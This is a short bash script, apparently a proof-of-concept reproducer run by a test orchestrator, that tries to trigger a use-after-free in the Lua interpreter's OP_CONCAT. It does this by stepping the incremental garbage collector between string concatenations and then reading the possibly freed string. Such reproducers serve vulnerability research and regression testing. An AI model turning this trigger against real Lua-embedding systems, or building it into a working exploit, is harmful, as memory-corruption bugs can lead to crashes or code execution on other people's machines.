#!/usr/bin/env bash
# Trigger the missing-write-barrier UAF in Lua's OP_CONCAT. WORKDIR is
# the built Lua source tree; the binary lives at src/lua.
set -u
cd "${WORKDIR:?WORKDIR must be set by the orchestrator}"

# Force the incremental collector into a state where a step between the
# concat and the next opcode will sweep the new string. `generational`
# or a tight `step` loop both work; we use `step` for determinism.
./src/lua -e '
  collectgarbage("stop")
  collectgarbage("incremental")
  local a = string.rep("a", 64)
  local b = string.rep("b", 64)
  for _ = 1, 256 do
    local s = a .. b            -- OP_CONCAT, new TString in a register
    collectgarbage("step", 4)    -- let the GC advance past the write
    if #s ~= 128 then error("reclaimed") end  -- read of possibly freed memory
  end
'
